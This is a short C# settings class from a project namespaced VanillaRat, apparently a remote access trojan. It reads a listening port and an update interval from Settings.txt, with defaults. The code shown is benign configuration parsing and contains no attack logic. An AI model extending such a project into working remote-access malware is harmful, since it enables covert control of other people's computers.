using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace VanillaRat.Classes
{
    class Settings
    {
        public struct Values
        {
            public int GetPort()
            {
                string Settings;
                if (!File.Exists("Settings.txt"))
                {
                    return 1604;
                } else
                {
                    using (StreamReader SR = new StreamReader("Settings.txt"))
                    {
                        Settings = SR.ReadToEnd();
                        SR.Close();
                    }
                    return Convert.ToInt16(Functions.GetSubstringByString("(", ")", Settings));
                }
            }
            public int GetUpdateInterval()
            {
                string Settings;
                if (!File.Exists("Settings.txt"))
                {
                    return 200;
                } else
                {
                    using (StreamReader SR = new StreamReader("Settings.txt"))
                    {
                        Settings = SR.ReadToEnd();
                        SR.Close();
                    }
                    return Convert.ToInt16(Functions.GetSubstringByString("<", ">", Settings));
                }
            }
        }
    }
}
